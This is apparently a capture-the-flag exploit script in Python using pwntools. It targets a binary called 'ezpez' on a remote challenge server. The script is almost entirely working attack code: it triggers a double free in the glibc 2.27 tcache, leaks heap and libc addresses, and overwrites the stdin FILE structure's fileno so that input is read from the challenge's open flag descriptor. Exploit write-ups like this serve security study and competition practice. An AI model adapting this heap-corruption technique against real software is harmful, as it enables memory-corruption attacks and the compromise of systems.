
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 35.244.10.136 --port 10250 ./ezpez
from pwn import *
context.update(arch="amd64", os="linux")
context.log_level = 'error'

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ezpez')
libc = ELF('./libc.so.6')

host = args.HOST or '35.244.10.136'
port = int(args.PORT or 10250)

def add(type, data):
  io.sendlineafter('>> ', '1')
  io.sendlineafter('> ', str(type))
  io.sendlineafter('number: ',str(data))

def free(type):
  io.sendlineafter('>> ', '2')
  io.sendlineafter('> ', str(type))

def show(type):
  io.sendlineafter('>> ', '3')
  io.sendlineafter('> ', str(type))

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

io = connect(host, port)

# double free vuln on libc-2.27
add(1, 0x41)
free(1)
add(2, 0x42)
free(2)
add(2, 0x42)
free(1)

# we leak low 32 bit of heap
show(1)

# use the double free to allocate a bloc on heap tcache head list.. and fill the number of bloc allocated with shit...
io.recvuntil('number :',drop=True)
leak = int(io.recvuntil('\n',drop=True),10)
print('leak = '+tohex(leak,32))
add(1, (leak & 0xffffffff)-0x250)
add(1, (leak & 0xffffffff)-0x250)
add(1, -1)

for i in range(7):
  free(1)
  add(2, 0x42)

free(1)
show(1)

# leak libc 32bit low address (from arena)
io.recvuntil('number :',drop=True)
leak2 = int(io.recvuntil('\n',drop=True),10)
libc_low = leak2 - 0x3ebca0
print('libc_low = '+tohex(libc_low,32))

add(1, 0)
# allocate a bloc on stdin fileno entry
add(1, (libc_low + libc.symbols['_IO_2_1_stdin_'] + 112))
add(1,'A')
free(1)
add(2,'B')
free(1)

add(1, (leak & 0xffffffff)-0x220)
add(1, (leak & 0xffffffff)-0x220)
add(1,'C')
# next bloc will overwrite stdin fileno entry, with 666 fd number
add(1, 666)

#Â scanf input, will return us the flag for the open flag filedescriptor now
io.sendlineafter('>> ', '4')

io.interactive()

